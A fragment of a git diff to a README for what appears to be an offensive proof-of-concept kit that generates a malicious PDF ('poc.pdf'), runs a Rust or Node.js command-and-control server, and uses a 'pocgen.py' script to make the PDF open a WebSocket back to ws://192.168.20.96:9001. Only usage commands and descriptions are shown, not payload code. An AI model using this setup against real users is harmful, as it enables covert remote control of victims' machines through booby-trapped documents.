@@ -85,30 +85,15 @@ futures = "0.3"
 anyhow = "1"
 ```
 
-**Optional (if you prefer Node.js C2):**
-
-```bash
-npm install ws
-```
 
 ---
 
 ## 🛠 Usage
 
-### Step 1: Generate Exploit Files
 
 ```bash
 cargo run
 ```
-
-✅ This will generate:
-
-- `poc.pdf` — malicious payload PDF
-- `c2_server.js` — (if using Node.js C2)
-
----
-
-### Step 2: Host the Files
 
 In the same folder, you should have:
 
@@ -371,8 +356,7 @@ python3 pocgen.py 192.168.20.96
 
     Auto-starts the WebSocket back to ws://192.168.20.96:9001
 
-✅ Works 1:1 with your Rust C2 server setup!
----
+
 
 ---
 
